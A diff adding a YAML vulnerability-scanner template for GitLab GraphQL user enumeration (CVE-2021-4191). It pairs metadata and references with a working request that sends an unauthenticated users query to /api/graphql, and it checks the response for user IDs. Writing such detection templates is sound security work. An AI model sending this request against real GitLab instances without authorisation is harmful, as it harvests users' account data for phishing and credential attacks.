@@ -1,0 +1,59 @@
+id: GITLAB_GRAPHQL_USER_ENUM
+info:
+  name: "GitLab GraphQL API User Enumeration"
+  description: "This vulnerability allows attackers to exploit the GraphQL API to retrieve information about registered users on a GitLab instance. By sending specially crafted requests, attackers can enumerate user accounts, including usernames and other metadata, which may be used for further targeted attacks, such as phishing or credential stuffing. This vulnerability affects the confidentiality of user information."
+  details:  "This vulnerability arises due to insufficient access controls on the GraphQL API. Attackers can query the API with specially crafted requests to extract user-related information without proper authentication. This issue affects GitLab versions prior to the security patch, allowing an attacker to gather sensitive user data, including usernames and user IDs, potentially leading to further exploitation or targeted attacks. Updating to the latest GitLab version mitigates this risk."
+  impact: "The impact of this vulnerability is that attackers can collect sensitive user information, such as usernames, email addresses, and user IDs, without proper authentication. This can lead to targeted attacks, phishing, and social engineering. In some cases, it might expose internal user accounts, increasing the risk of unauthorized access or further exploitation of the system."
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: GITLAB_GRAPHQL_USER_ENUM
+  severity: MEDIUM
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2021-4191
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "/api/graphql"
+      - modify_method: POST
+      - replace_body: '{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}'
+      - modify_header:
+          referer: "${urlVar}/-/graphql-explorer"
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    contains_all:
+      - '"data"'
+      - '"users"'
+      - '"nodes"'
+      - '"id"'
+      - 'gid://'
+    length:
+      gt: 0
